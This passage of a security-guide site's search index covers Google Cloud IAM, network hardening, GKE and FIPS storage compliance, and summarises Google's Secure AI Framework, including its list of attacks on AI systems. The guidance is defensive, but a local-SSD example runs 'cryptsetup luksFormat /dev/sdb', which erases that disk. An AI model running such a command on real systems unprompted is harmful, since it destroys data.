IAM policies</li> <li>Create CI/CD pipelines for IAM changes</li> </ul>"},{"location":"gcp/iam/#resources","title":"Resources","text":"<ul> <li>Google Cloud IAM Documentation</li> <li>CIS Google Cloud Foundation Benchmark</li> <li>Google Cloud Security Best Practices Center</li> </ul> <p>This guide is continually updated as Google Cloud IAM capabilities evolve.</p>"},{"location":"gcp/logging-monitoring/","title":"Cloud Logging &amp; Monitoring for Security","text":"<p>Under Construction</p> <p>This page is under construction. Please check back later for comprehensive guidance on security logging and monitoring in Google Cloud Platform.</p>"},{"location":"gcp/logging-monitoring/#overview","title":"Overview","text":"<p>This section will provide detailed guidance on implementing effective security monitoring in Google Cloud Platform including:</p> <ul> <li>Cloud Logging</li> <li>Cloud Monitoring</li> <li>Log Analytics</li> <li>Audit Logs</li> <li>Security Logging Patterns</li> <li>Alert Construction</li> </ul>"},{"location":"gcp/logging-monitoring/#coming-soon","title":"Coming Soon","text":"<ul> <li>Essential security logs to collect</li> <li>Log retention strategies</li> <li>Security monitoring dashboards</li> <li>Alert triage workflows</li> <li>Integration with SIEM solutions</li> <li>Automated response playbooks</li> </ul>"},{"location":"gcp/network-security/","title":"Network Security","text":"<p>Under Construction</p> <p>This page is under construction. Please check back later for comprehensive guidance</p>"},{"location":"gcp/network-security/#network-security-in-google-cloud-platform","title":"Network Security in Google Cloud Platform","text":"<p>Securing network infrastructure is a critical component of cloud security. This guide covers network security architecture, controls, and best practices for Google Cloud Platform environments.</p>"},{"location":"gcp/network-security/#core-network-security-concepts","title":"Core Network Security Concepts","text":""},{"location":"gcp/network-security/#vpc-architecture","title":"VPC Architecture","text":"<p>Google Cloud VPC (Virtual Private Cloud) provides network segmentation and isolation:</p> <ul> <li>VPC Networks: Software-defined networks that provide global connectivity</li> <li>Subnets: Regional IP address ranges for resources</li> <li>Peering: Connecting VPC networks with each other</li> <li>Shared VPC: Centrally managed network shared across projects</li> </ul>"},{"location":"gcp/network-security/#defense-in-depth","title":"Defense in Depth","text":"<p>Implement multiple network security controls:</p> <ul> <li>Perimeter Security: VPC Service Controls and organization policy constraints</li> <li>Network Security: Firewalls, security groups, and Network Intelligence Center</li> <li>Resource Security: Identity-aware access controls and service-specific protections</li> </ul>"},{"location":"gcp/network-security/#security-best-practices","title":"Security Best Practices","text":""},{"location":"gcp/network-security/#secure-vpc-design","title":"Secure VPC Design","text":"<ul> <li>Implement a hub-and-spoke or similar network topology</li> <li>Segment networks based on security requirements</li> <li>Use private Google Access for services</li> <li>Implement VPC Service Controls for sensitive data</li> </ul>"},{"location":"gcp/network-security/#firewall-configuration","title":"Firewall Configuration","text":"<ul> <li>Implement default-deny policies</li> <li>Allow only necessary traffic</li> <li>Use hierarchical firewall policies for organization-wide rules</li> <li>Implement tags and service accounts for dynamic firewall rules</li> </ul>"},{"location":"gcp/network-security/#connectivity-security","title":"Connectivity Security","text":"<ul> <li>Use Cloud VPN or Cloud Interconnect with encryption</li> <li>Implement Private Service Connect for Google APIs and services</li> <li>Use Cloud NAT for controlled egress</li> <li>Implement BeyondCorp Enterprise for zero-trust access</li> </ul>"},{"location":"gcp/network-security/#traffic-inspection","title":"Traffic Inspection","text":"<ul> <li>Deploy Cloud IDS for network threat detection</li> <li>Implement Cloud Armor for web application and DDoS protection</li> <li>Use Network Intelligence Center for visibility into traffic patterns</li> <li>Configure VPC Flow Logs for network monitoring</li> </ul>"},{"location":"gcp/network-security/#implementation-guide","title":"Implementation Guide","text":""},{"location":"gcp/network-security/#secure-network-architecture","title":"Secure Network Architecture","text":"<ol> <li>Design network segmentation</li> <li>Create separate VPC networks for production, development, and testing</li> <li> <p>Implement security boundaries between high and low-sensitivity data</p> </li> <li> <p>Configure secure connectivity</p> </li> <li>Set up private connectivity to Google services</li> <li> <p>Implement secure hybrid connectivity for on-premises resources</p> </li> <li> <p>Implement defense in depth</p> </li> <li>Deploy multiple security controls at different layers</li> <li>Configure monitoring and threat detection</li> </ol>"},{"location":"gcp/network-security/#security-hardening-steps","title":"Security Hardening Steps","text":"<pre><code># Example: Create a VPC with private Google access\ngcloud compute networks create secure-network --subnet-mode=custom\n\n# Create subnet with private Google access enabled\ngcloud compute networks subnets create secure-subnet \\\n    --network=secure-network \\\n    --region=us-central1 \\\n    --range=10.0.0.0/24 \\\n    --enable-private-ip-google-access\n\n# Example: Create a firewall rule allowing only necessary traffic\ngcloud compute firewall-rules create allow-internal \\\n    --direction=INGRESS \\\n    --priority=1000 \\\n    --network=secure-network \\\n    --action=ALLOW \\\n    --rules=tcp:22,tcp:3389,icmp \\\n    --source-ranges=10.0.0.0/24\n\n# Enable VPC Flow Logs\ngcloud compute networks subnets update secure-subnet \\\n    --region=us-central1 \\\n    --enable-flow-logs\n</code></pre>"},{"location":"gcp/network-security/#network-security-controls","title":"Network Security Controls","text":""},{"location":"gcp/network-security/#firewall-rules","title":"Firewall Rules","text":"<ul> <li>Hierarchical Firewalls: Organization and folder-level rules</li> <li>VPC Firewalls: Network-level rules</li> <li>Firewall Insights: Analyzing rule usage and recommending optimizations</li> </ul>"},{"location":"gcp/network-security/#cloud-armor","title":"Cloud Armor","text":"<ul> <li>Web Application Firewall (WAF) capabilities</li> <li>DDoS protection</li> <li>Edge security for applications</li> <li>Preconfigured rules for common attacks (OWASP Top 10)</li> </ul>"},{"location":"gcp/network-security/#vpc-service-controls","title":"VPC Service Controls","text":"<ul> <li>Creating security perimeters around resources</li> <li>Preventing data exfiltration</li> <li>Implementing context-aware access</li> <li>Securing APIs and services</li> </ul>"},{"location":"gcp/network-security/#cloud-ids","title":"Cloud IDS","text":"<ul> <li>Network-based threat detection</li> <li>Intrusion detection capabilities</li> <li>Integration with security operations</li> </ul>"},{"location":"gcp/network-security/#common-risks-and-mitigations","title":"Common Risks and Mitigations","text":"Risk Mitigation Lateral movement Implement network segmentation and microsegmentation Data exfiltration Deploy VPC Service Controls and egress control Unauthorized access Implement BeyondCorp and IAP for zero-trust access External attacks Configure Cloud Armor and DDoS protection Misconfigurations Use Security Command Center and regular auditing"},{"location":"gcp/network-security/#advanced-topics","title":"Advanced Topics","text":""},{"location":"gcp/network-security/#zero-trust-network-security","title":"Zero Trust Network Security","text":"<ul> <li>Implement BeyondCorp Enterprise</li> <li>Deploy Identity-Aware Proxy (IAP) for application access</li> <li>Move beyond network-based security to identity-based controls</li> </ul>"},{"location":"gcp/network-security/#network-security-for-kubernetes","title":"Network Security for Kubernetes","text":"<ul> <li>Configure GKE private clusters</li> <li>Implement network policies</li> <li>Use Binary Authorization for workload security</li> <li>Deploy Service Mesh for fine-grained traffic control</li> </ul>"},{"location":"gcp/network-security/#multi-cloud-network-security","title":"Multi-Cloud Network Security","text":"<ul> <li>Consistent security controls across environments</li> <li>Centralized monitoring and management</li> <li>Secure connectivity between cloud providers</li> </ul>"},{"location":"gcp/network-security/#resources","title":"Resources","text":"<ul> <li>Google Cloud Network Security Documentation</li> <li>Google Cloud Shared VPC Documentation</li> <li>VPC Service Controls Documentation</li> <li>Network Intelligence Center</li> </ul> <p>This guide is continually updated as Google Cloud network security capabilities evolve.</p>"},{"location":"gcp/saif-framework/","title":"Google's Secure AI Framework (SAIF)","text":""},{"location":"gcp/saif-framework/#overview","title":"Overview","text":"<p>An additional framework covering security risks in AI applications is Google's Secure AI Framework (SAIF). It provides actionable principles for secure development of the entire AI pipeline - from data collection to model deployment. While SAIF provides a list of security risks similar to OWASP, it goes even further and provides a holistic approach to developing secure AI applications. This includes the integration of security and privacy in the entire AI pipeline. OWASP provides a targeted, technical checklist of vulnerabilities, whereas SAIF offers a broader perspective on secure AI development as a whole.</p>"},{"location":"gcp/saif-framework/#saif-areas-and-components","title":"SAIF Areas and Components","text":"<p>In SAIF, there are four different areas of secure AI development. Each comprises multiple components:</p> <ul> <li><code>Data</code>: This area consists of all components relating to data such as <code>data sources</code>, <code>data filtering and processing</code>, and <code>training data</code>.</li> <li><code>Infrastructure</code>: This area relates to the hardware on which the application is hosted, as well as data storage and development platforms. Infrastructure components are the <code>Model Frameworks and Code</code> required to run the AI application, the processes of <code>Training, Tuning, and Evaluation</code>, <code>Data and Model Storage</code>, and the process of deploying a model (<code>Model Serving</code>).</li> <li><code>Model</code>: This is the central area of any AI application. It comprises the <code>Model</code>, <code>Input Handling</code>, and <code>Output Handling</code> components.</li> <li><code>Application</code>: This area relates to the interaction with the AI application, i.e., it consists of the <code>Applications</code> interacting with the AI deployment and potential <code>Agents</code> or <code>Plugins</code> used by the AI deployment.</li> </ul> <p>We will use a similar categorization throughout this module and the remainder of the <code>AI Red Teamer</code> path.</p>"},{"location":"gcp/saif-framework/#saif-risks","title":"SAIF Risks","text":"<p>Like OWASP's Top 10, SAIF describes concrete security risks that may arise in AI applications. Here is an overview of the risks included in SAIF. Many are also included in OWASP's ML Top 10 or LLM Top 10:</p> <ul> <li><code>Data Poisoning</code>: Attackers inject malicious or misleading data into the model's training data, compromising performance or creating backdoors.</li> <li><code>Unauthorized Training Data</code>: The model is trained on unauthorized data, resulting in legal or ethical issues.</li> <li><code>Model Source Tampering</code>: Attackers manipulate the model's source code or weights, compromising performance or creating backdoors.</li> <li><code>Excessive Data Handling</code>: Data collection or retention goes beyond what is allowed in the corresponding privacy policies, resulting in legal issues.</li> <li><code>Model Exfiltration</code>: Attackers gain unauthorized access to the model itself, stealing intellectual property and potentially causing financial harm.</li> <li><code>Model Deployment Tampering</code>: Attackers manipulate components used for model deployment, compromising performance or creating backdoors.</li> <li><code>Denial of ML Service</code>: Attackers feed inputs to the model that result in high resource consumption, potentially causing disruptions to the ML service.</li> <li><code>Model Reverse Engineering</code>: Attackers gain unauthorized access to the model itself by analyzing its inputs and outputs, stealing intellectual property, and potentially causing financial harm.</li> <li><code>Insecure Integrated Component</code>: Attackers exploit security vulnerabilities in software interacting with the model, such as plugins.</li> <li><code>Prompt Injection</code>: Attackers manipulate the model's input directly or indirectly to cause malicious or illegal behavior.</li> <li><code>Model Evasion</code>: Attackers manipulate the model's input by applying slight perturbations to cause incorrect inference results.</li> <li><code>Sensitive Data Disclosure</code>: Attackers trick the model into revealing sensitive information in the response.</li> <li><code>Inferred Sensitive Data</code>: The model provides sensitive information that it did not have access to by inferring it from training data or prompts. The key difference to the previous risk is that the model does not have access to the sensitive data but provides it by inferring it.</li> <li><code>Insecure Model Output</code>: Model output is handled insecurely, potentially resulting in injection vulnerabilities.</li> <li><code>Rogue Actions</code>: Attackers exploit insufficiently restricted model access to cause harm.</li> </ul>"},{"location":"gcp/saif-framework/#saif-controls","title":"SAIF Controls","text":"<p>SAIF specifies how to mitigate each risk and who is responsible for this mitigation. The party responsible can either be the <code>model creator</code>, i.e., the party developing the model, or the <code>model consumer</code>, i.e., the party using the model in an AI application. For instance, if <code>HackTheBox</code> used <code>Google's Gemini model</code> for an AI chatbot, Google would be the model creator, while HackTheBox would be the model consumer. These mitigations are called controls. Each control is mapped to one of the previously discussed risks. For instance, here are a few example controls from SAIF:</p> <ul> <li><code>Input Validation and Sanitization</code>: Detect malicious queries and react appropriately, for instance, by blocking or restricting them.<ul> <li>Risk mapping: <code>Prompt Injection</code></li> <li>Implemented by: <code>Model Creators, Model Consumers</code></li> </ul> </li> <li><code>Output Validation and Sanitization</code>: Validate or sanitize model output before processing by the application.<ul> <li>Risk mapping: <code>Prompt Injection, Rogue Actions, Sensitive Data Disclosure, Inferred Sensitive Data</code></li> <li>Implemented by: <code>Model Creators, Model Consumers</code></li> </ul> </li> <li><code>Adversarial Training and Testing</code>: Train the model on adversarial inputs to strengthen resilience against attacks.<ul> <li>Risk mapping: <code>Model Evasion, Prompt Injection, Sensitive Data Disclosure, Inferred Sensitive Data, Insecure Model Output</code></li> <li>Implemented by: <code>Model Creators, Model Consumers</code></li> </ul> </li> </ul> <p>We will not discuss all SAIF controls here, feel free to check out the remaining controls here.</p>"},{"location":"gcp/saif-framework/#saif-risk-map","title":"SAIF Risk Map","text":"<p>The Risk Map is the central SAIF component encompassing information about components, risks, and controls in a single place. It provides an overview of the different components interacting in an AI application, the risks that arise in each component, and how to mitigate them. Furthermore, the map provides information about where a security risk is introduced (<code>risk introduction</code>), where the risk may be exploited (<code>risk exposure</code>), and where a risk may be mitigated (<code>risk mitigation</code>).</p> <p></p>"},{"location":"gcp/security-command-center/","title":"Security Command Center","text":"<p>Under Construction</p> <p>This page is under construction. Please check back later for comprehensive guidance on Security Command Center in Google Cloud Platform.</p>"},{"location":"gcp/security-command-center/#overview","title":"Overview","text":"<p>This section will provide detailed guidance on using Security Command Center (SCC) in Google Cloud Platform including:</p> <ul> <li>Overview of Security Command Center capabilities</li> <li>Tier options (Standard vs Premium)</li> <li>Vulnerability detection</li> <li>Threat detection</li> <li>Misconfigurations and compliance findings</li> <li>Integration with other GCP services</li> </ul>"},{"location":"gcp/security-command-center/#coming-soon","title":"Coming Soon","text":"<ul> <li>Setting up Security Command Center</li> <li>Configuring built-in security sources</li> <li>Understanding security findings</li> <li>Remediation strategies for common findings</li> <li>Integration with third-party security tools</li> <li>Security posture management best practices</li> </ul>"},{"location":"gcp/storage-security/","title":"Storage &amp; Database Security in Google Cloud Platform","text":"<p>Under Construction</p> <p>This page is under construction. Please check back later for comprehensive guidance on securing storage and database services in Google Cloud Platform.</p>"},{"location":"gcp/storage-security/#overview","title":"Overview","text":"<p>This section will provide detailed guidance on securing various storage and database resources in Google Cloud Platform including:</p> <ul> <li>Cloud Storage</li> <li>Cloud SQL</li> <li>Firestore</li> <li>Bigtable</li> <li>Spanner</li> <li>BigQuery</li> </ul>"},{"location":"gcp/storage-security/#coming-soon","title":"Coming Soon","text":"<ul> <li>Encryption options for data at rest</li> <li>Customer-managed encryption keys (CMEK)</li> <li>Access control patterns for storage resources</li> <li>Database security best practices</li> <li>Database audit logging</li> <li>Data classification and protection strategies</li> </ul>"},{"location":"gcp/gke/","title":"Google Kubernetes Engine (GKE) Security","text":""},{"location":"gcp/gke/#overview","title":"Overview","text":"<p>Google Kubernetes Engine (GKE) is Google Cloud's managed Kubernetes service that provides a secure, scalable platform for containerized applications. This section covers security best practices, compliance requirements, and implementation guidance for GKE environments.</p>"},{"location":"gcp/gke/#key-security-features","title":"Key Security Features","text":""},{"location":"gcp/gke/#cluster-security","title":"Cluster Security","text":"<ul> <li>Shielded GKE Nodes: Secure boot, virtual trusted platform module (vTPM), and integrity monitoring</li> <li>Private Clusters: Nodes without public IP addresses, accessible only via private Google Cloud networks</li> <li>Authorized Networks: IP allowlisting for API server access</li> <li>Workload Identity: Secure pod-to-GCP service authentication</li> </ul>"},{"location":"gcp/gke/#network-security","title":"Network Security","text":"<ul> <li>Network Policies: Kubernetes-native traffic control between pods</li> <li>Service Mesh: Istio/Anthos Service Mesh for advanced traffic management</li> <li>Private Service Connect: Private connectivity to Google APIs</li> <li>Binary Authorization: Deploy-time security controls for container images</li> </ul>"},{"location":"gcp/gke/#compliance-and-governance","title":"Compliance and Governance","text":"<ul> <li>FIPS 140-2 Compliance: Validated cryptographic modules for data protection</li> <li>FedRAMP Authorization: High-impact level compliance for government workloads</li> <li>PCI DSS: Payment card industry compliance capabilities</li> <li>HIPAA: Healthcare data protection compliance</li> </ul>"},{"location":"gcp/gke/#security-guides","title":"Security Guides","text":"<ul> <li> <p> FIPS 140-2 Compliance</p> <p>Complete guide to FIPS-compliant storage options and cryptographic validation in GKE</p> <p> FIPS Compliance Guide</p> </li> <li> <p> Cluster Hardening</p> <p>Best practices for securing GKE clusters following CIS Kubernetes Benchmark</p> <p> Coming Soon</p> </li> <li> <p> Workload Identity</p> <p>Implementing secure pod-to-GCP service authentication without service account keys</p> <p> Coming Soon</p> </li> <li> <p> Network Policies</p> <p>Implementing zero-trust networking with Kubernetes network policies</p> <p> Coming Soon</p> </li> </ul>"},{"location":"gcp/gke/#quick-security-checks","title":"Quick Security Checks","text":""},{"location":"gcp/gke/#verify-cluster-security-settings","title":"Verify Cluster Security Settings","text":"<pre><code># Check if Shielded GKE nodes are enabled\ngcloud container clusters describe CLUSTER_NAME \\\n  --zone=ZONE \\\n  --format=\"value(shieldedNodes.enabled)\"\n\n# List authorized networks\ngcloud container clusters describe CLUSTER_NAME \\\n  --zone=ZONE \\\n  --format=\"table(masterAuthorizedNetworksConfig.cidrBlocks[].cidrBlock)\"\n\n# Check if private cluster is enabled\ngcloud container clusters describe CLUSTER_NAME \\\n  --zone=ZONE \\\n  --format=\"value(privateClusterConfig.enablePrivateNodes)\"\n</code></pre>"},{"location":"gcp/gke/#audit-workload-identity-configuration","title":"Audit Workload Identity Configuration","text":"<pre><code># Check if Workload Identity is enabled\ngcloud container clusters describe CLUSTER_NAME \\\n  --zone=ZONE \\\n  --format=\"value(workloadIdentityConfig.workloadPool)\"\n\n# List service accounts with Workload Identity bindings\ngcloud iam service-accounts list --filter=\"displayName:gke-\"\n</code></pre>"},{"location":"gcp/gke/#review-binary-authorization-policy","title":"Review Binary Authorization Policy","text":"<pre><code># Export current Binary Authorization policy\ngcloud container binauthz policy export\n\n# List attestors\ngcloud container binauthz attestors list\n</code></pre>"},{"location":"gcp/gke/#common-security-tasks","title":"Common Security Tasks","text":""},{"location":"gcp/gke/#enable-fips-mode-on-nodes","title":"Enable FIPS Mode on Nodes","text":"<pre><code># Create node pool with FIPS-compliant boot disk\ngcloud container node-pools create fips-pool \\\n  --cluster=CLUSTER_NAME \\\n  --zone=ZONE \\\n  --image-type=COS_CONTAINERD \\\n  --enable-gvnic \\\n  --metadata=google-compute-enable-fips=TRUE\n</code></pre>"},{"location":"gcp/gke/#configure-network-policies","title":"Configure Network Policies","text":"<pre><code># Example: Deny all ingress traffic by default\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: default-deny-ingress\n  namespace: production\nspec:\n  podSelector: {}\n  policyTypes:\n  - Ingress\n</code></pre>"},{"location":"gcp/gke/#implement-pod-security-standards","title":"Implement Pod Security Standards","text":"<pre><code># Example: Enforce restricted security policy\napiVersion: v1\nkind: Namespace\nmetadata:\n  name: secure-namespace\n  labels:\n    pod-security.kubernetes.io/enforce: restricted\n    pod-security.kubernetes.io/audit: restricted\n    pod-security.kubernetes.io/warn: restricted\n</code></pre>"},{"location":"gcp/gke/#compliance-quick-reference","title":"Compliance Quick Reference","text":"Compliance Framework GKE Support Key Requirements FIPS 140-2 \u2705 Supported Use validated crypto modules, FIPS-mode nodes FedRAMP High \u2705 Supported Use compliant regions, enable audit logging PCI DSS \u2705 Supported Network segmentation, encryption, access controls HIPAA \u2705 Supported Encryption at rest/transit, audit logs, BAAs SOC 2 \u2705 Supported Security controls, monitoring, incident response"},{"location":"gcp/gke/#security-best-practices","title":"Security Best Practices","text":"<ol> <li>Use Autopilot Mode when possible for Google-managed security hardening</li> <li>Enable Shielded GKE Nodes for enhanced node security</li> <li>Implement Workload Identity instead of service account keys</li> <li>Use Binary Authorization to ensure only verified images are deployed</li> <li>Enable audit logging and ship logs to Cloud Logging</li> <li>Regularly update clusters and nodes to latest versions</li> <li>Implement network policies for pod-to-pod traffic control</li> <li>Use private clusters to reduce attack surface</li> </ol>"},{"location":"gcp/gke/#additional-resources","title":"Additional Resources","text":"<ul> <li>GKE Security Best Practices</li> <li>GKE Compliance</li> <li>CIS GKE Benchmark</li> <li>Anthos Security Blueprint</li> </ul>"},{"location":"gcp/gke/fips-compliance/","title":"FIPS 140-2 Compliance in Google Kubernetes Engine","text":""},{"location":"gcp/gke/fips-compliance/#overview","title":"Overview","text":"<p>Federal Information Processing Standard (FIPS) 140-2 is a U.S. government standard that defines minimum security requirements for cryptographic modules. This guide covers FIPS-compliant storage options in GKE and how to implement them for both Autopilot and Standard clusters.</p>"},{"location":"gcp/gke/fips-compliance/#fips-compliance-in-gke","title":"FIPS Compliance in GKE","text":"<p>GKE provides FIPS 140-2 compliance through: - Validated Cryptographic Modules: Google Cloud uses FIPS 140-2 validated modules for encryption - FIPS-mode Operating System: Container-Optimized OS (COS) with FIPS mode enabled - Compliant Storage Options: Multiple storage backends with FIPS validation - Network Encryption: TLS 1.2+ with FIPS-approved algorithms</p>"},{"location":"gcp/gke/fips-compliance/#storage-options-comparison","title":"Storage Options Comparison","text":"Storage Option Autopilot Support Standard Support FIPS 140-2 Compliance Notes (Encryption &amp; Access) GCE Persistent Disk (Block Storage) Yes (default PV) Yes (default PV) Yes \u2013 Encrypted at rest by default using FIPS 140-2 validated module Block storage (zonal or regional); single-writer (RWO) access. Cloud Storage Bucket (GCS FUSE CSI) Yes (with CSI) Yes (with CSI) Yes \u2013 Encrypted at rest by default (AES-256 via FIPS module) Object storage mounted via CSI driver; uses TLS in transit. Filestore (Managed NFS) Yes (with CSI) Yes (with CSI) Yes \u2013 Encrypted at rest by default (FedRAMP-authorized storage) NFS file storage (multi-writer RWX); within VPC for in-transit protection. Local SSD (Ephemeral node disk) No Yes (node config) No (Default) \u2013 Not FIPS-validated by default; requires additional FIPS encryption in software. High-performance ephemeral disk on node; not persistent across node restart. NetApp Cloud Volumes (CVS) Limited \u2020 Yes (via CSI) Yes \u2013 Encrypted at rest by Google (FIPS module) + optional NetApp FIPS encryption Managed NFS/SMB service; uses Astra Trident CSI in GKE; TLS 1.2 for data transfer. Portworx (PX Enterprise SDS) No Yes (via DaemonSet) Configurable \u2013 Uses FIPS 140-2 certified crypto for volume encryption when enabled Software-defined storage inside cluster; encrypts volumes with FIPS-compliant libraries. Other Vendor Storage (Ceph, etc.) Varies Yes (via CSI) Configurable \u2013 Depends on vendor (must use FIPS-validated encryption on backend). E.g. Ceph/Rook or storage array CSI drivers; generally Standard cluster only. <p>\u2020 NetApp CVS in Autopilot requires specific configurations and may have limitations</p>"},{"location":"gcp/gke/fips-compliance/#implementing-fips-compliant-storage","title":"Implementing FIPS-Compliant Storage","text":""},{"location":"gcp/gke/fips-compliance/#1-gce-persistent-disks-recommended-default","title":"1. GCE Persistent Disks (Recommended Default)","text":"<p>Create FIPS-compliant persistent disk: <pre><code>apiVersion: v1\nkind: PersistentVolumeClaim\nmetadata:\n  name: fips-pvc\nspec:\n  accessModes:\n    - ReadWriteOnce\n  resources:\n    requests:\n      storage: 100Gi\n  storageClassName: standard-rwo  # Uses GCE PD with FIPS encryption\n</code></pre></p> <p>Verify disk encryption: <pre><code># Get disk name from PVC\nDISK_NAME=$(kubectl get pvc fips-pvc -o jsonpath='{.spec.volumeName}')\n\n# Check disk encryption\ngcloud compute disks describe $DISK_NAME \\\n  --zone=ZONE \\\n  --format=\"value(diskEncryptionKey)\"\n</code></pre></p>"},{"location":"gcp/gke/fips-compliance/#2-cloud-storage-with-gcs-fuse-csi","title":"2. Cloud Storage with GCS FUSE CSI","text":"<p>Enable GCS FUSE CSI driver: <pre><code># For new cluster\ngcloud container clusters create CLUSTER_NAME \\\n  --addons=GcsFuseCsiDriver \\\n  --zone=ZONE\n\n# For existing cluster\ngcloud container clusters update CLUSTER_NAME \\\n  --update-addons=GcsFuseCsiDriver=ENABLED \\\n  --zone=ZONE\n</code></pre></p> <p>Create FIPS-compliant GCS bucket storage: <pre><code>apiVersion: v1\nkind: PersistentVolumeClaim\nmetadata:\n  name: gcs-fips-pvc\nspec:\n  accessModes:\n    - ReadWriteMany\n  resources:\n    requests:\n      storage: 100Gi\n  storageClassName: gcsfuse-csi\n</code></pre></p>"},{"location":"gcp/gke/fips-compliance/#3-filestore-for-multi-writer-access","title":"3. Filestore for Multi-Writer Access","text":"<p>Create Filestore instance with CMEK: <pre><code># Create KMS key for additional encryption layer\ngcloud kms keyrings create filestore-keyring \\\n  --location=us-central1\n\ngcloud kms keys create filestore-key \\\n  --location=us-central1 \\\n  --keyring=filestore-keyring \\\n  --purpose=encryption\n\n# Create Filestore with CMEK\ngcloud filestore instances create fips-filestore \\\n  --tier=BASIC_HDD \\\n  --file-share=name=vol1,capacity=1TB \\\n  --network=name=default \\\n  --zone=us-central1-a \\\n  --kms-key=projects/PROJECT_ID/locations/us-central1/keyRings/filestore-keyring/cryptoKeys/filestore-key\n</code></pre></p> <p>Mount in GKE: <pre><code>apiVersion: v1\nkind: PersistentVolume\nmetadata:\n  name: filestore-pv\nspec:\n  capacity:\n    storage: 1Ti\n  accessModes:\n    - ReadWriteMany\n  nfs:\n    server: FILESTORE_IP\n    path: /vol1\n  storageClassName: \"\"\n</code></pre></p>"},{"location":"gcp/gke/fips-compliance/#4-configuring-fips-mode-on-nodes","title":"4. Configuring FIPS Mode on Nodes","text":"<p>Create node pool with FIPS mode enabled: <pre><code>gcloud container node-pools create fips-pool \\\n  --cluster=CLUSTER_NAME \\\n  --zone=ZONE \\\n  --image-type=COS_CONTAINERD \\\n  --metadata=google-compute-enable-fips=TRUE \\\n  --machine-type=n2-standard-4 \\\n  --num-nodes=3\n</code></pre></p> <p>Verify FIPS mode on nodes: <pre><code># SSH into node and check FIPS status\nkubectl debug node/NODE_NAME -it --image=busybox\ncat /proc/sys/crypto/fips_enabled  # Should return \"1\"\n</code></pre></p>"},{"location":"gcp/gke/fips-compliance/#compliance-verification","title":"Compliance Verification","text":""},{"location":"gcp/gke/fips-compliance/#check-storage-encryption-status","title":"Check Storage Encryption Status","text":"<pre><code>#!/bin/bash\n# Audit all PVCs for encryption compliance\n\necho \"=== PVC Encryption Audit ===\"\nfor pvc in $(kubectl get pvc -A -o custom-columns=NAMESPACE:.metadata.namespace,NAME:.metadata.name --no-headers); do\n  namespace=$(echo $pvc | awk '{print $1}')\n  name=$(echo $pvc | awk '{print $2}')\n  \n  # Get backing disk\n  pv=$(kubectl get pvc $name -n $namespace -o jsonpath='{.spec.volumeName}')\n  disk_name=$(kubectl get pv $pv -o jsonpath='{.spec.gcePersistentDisk.pdName}' 2&gt;/dev/null)\n  \n  if [ ! -z \"$disk_name\" ]; then\n    echo \"PVC: $namespace/$name (Disk: $disk_name)\"\n    gcloud compute disks describe $disk_name --zone=ZONE --format=\"value(diskEncryptionKey.kmsKeyName)\"\n  fi\ndone\n</code></pre>"},{"location":"gcp/gke/fips-compliance/#validate-fips-module-usage","title":"Validate FIPS Module Usage","text":"<pre><code># Check GKE cluster for FIPS compliance indicators\ngcloud container clusters describe CLUSTER_NAME \\\n  --zone=ZONE \\\n  --format=\"yaml(nodeConfig.metadata,nodePools[].config.metadata)\"\n\n# Verify TLS configuration\nkubectl get deployments -A -o yaml | grep -E \"tls|TLS\" | grep -i version\n</code></pre>"},{"location":"gcp/gke/fips-compliance/#best-practices-for-fips-compliance","title":"Best Practices for FIPS Compliance","text":"<ol> <li>Always Use Encrypted Storage Classes</li> <li>Default GCE PD storage classes provide FIPS encryption</li> <li> <p>Avoid local SSDs unless implementing software encryption</p> </li> <li> <p>Enable FIPS Mode on All Nodes <pre><code># Ensure all node pools have FIPS metadata\n--metadata=google-compute-enable-fips=TRUE\n</code></pre></p> </li> <li> <p>Use Customer-Managed Encryption Keys (CMEK) <pre><code># Additional encryption layer with Cloud KMS\n--disk-encryption-key=projects/PROJECT/locations/LOCATION/keyRings/RING/cryptoKeys/KEY\n</code></pre></p> </li> <li> <p>Implement Network Encryption</p> </li> <li>Use Istio/Anthos Service Mesh for mTLS between pods</li> <li> <p>Ensure all external traffic uses TLS 1.2+</p> </li> <li> <p>Regular Compliance Audits</p> </li> <li>Scan for unencrypted volumes</li> <li>Verify FIPS mode on all nodes</li> <li>Check certificate compliance</li> </ol>"},{"location":"gcp/gke/fips-compliance/#troubleshooting","title":"Troubleshooting","text":""},{"location":"gcp/gke/fips-compliance/#issue-local-ssd-fips-compliance","title":"Issue: Local SSD FIPS Compliance","text":"<p>Problem: Local SSDs are not FIPS-compliant by default</p> <p>Solution: Implement software encryption <pre><code>apiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: fips-encryption-script\ndata:\n  setup.sh: |\n    #!/bin/bash\n    # Setup dm-crypt with FIPS-approved algorithms\n    cryptsetup luksFormat /dev/sdb --cipher aes-xts-plain64 --key-size 256\n    cryptsetup luksOpen /dev/sdb encrypted-local-ssd\n    mkfs.ext4 /dev/mapper/encrypted-local-ssd\n    mount /dev/mapper/encrypted-local-ssd /mnt/encrypted\n</code></pre></p>"},{"location":"gcp/gke/fips-compliance/#issue-verifying-encryption-in-transit","title":"Issue: Verifying Encryption in Transit","text":"<p>Check pod-to-pod encryption: <pre><code># Deploy network policy tester\nkubectl apply -f https://github.com/ahmetb/kubernetes-network-policy-recipes/raw/master/04-deny-traffic-from-other-namespaces.yaml\n\n# Verify TLS between services\nkubectl exec -it POD_NAME -- openssl s_client -connect SERVICE:PORT -tls1_2\n</code></pre></p>"},{"location":"gcp/gke/fips-compliance/#additional-resources","title":"Additional Resources","text":"<ul> <li>Google Cloud FIPS 140-2 Validated Cryptographic Modules</li> <li>GKE FIPS Compliance Documentation</li> <li>NIST FIPS 140-2 Standard</li> <li>Cloud KMS FIPS Documentation</li> </ul>"},{"location":"nist-fedramp/","title":"NIST/FedRAMP Controls Testing Guide","text":""},{"location":"nist-fedramp/#overview","title":"Overview","text":"<p>This comprehensive guide provides practical testing methodologies and checklists for evaluating NIST and FedRAMP security controls in Google Cloud Platform (GCP) and Google Workspace environments. Whether you're preparing for a FedRAMP assessment, conducting internal audits, or implementing NIST controls, these resources will help ensure thorough compliance validation.</p>"},{"location":"nist-fedramp/#purpose","title":"Purpose","text":"<ul> <li>Standardized Testing: Provide consistent methodologies for testing NIST/FedRAMP controls</li> <li>Google-Specific Guidance: Focus on GCP and Google Workspace implementation details</li> <li>Practical Tools: Include CLI commands, automation scripts, and assessment checklists</li> <li>Evidence Collection: Guide assessors in gathering appropriate documentation and artifacts</li> </ul>"},{"location":"nist-fedramp/#control-families","title":"Control Families","text":""},{"location":"nist-fedramp/#google-cloud-platform-gcp","title":"Google Cloud Platform (GCP)","text":"<ul> <li> <p> Access Control (AC)</p> 